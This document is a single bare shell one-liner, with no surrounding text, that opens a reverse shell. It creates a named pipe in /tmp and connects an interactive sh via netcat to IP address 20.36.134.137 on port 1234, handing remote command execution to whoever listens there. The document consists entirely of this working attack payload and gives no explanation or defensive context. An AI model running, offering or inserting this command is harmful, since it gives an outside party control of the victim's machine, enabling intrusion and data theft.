rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 20.36.134.137 1234 >/tmp/f
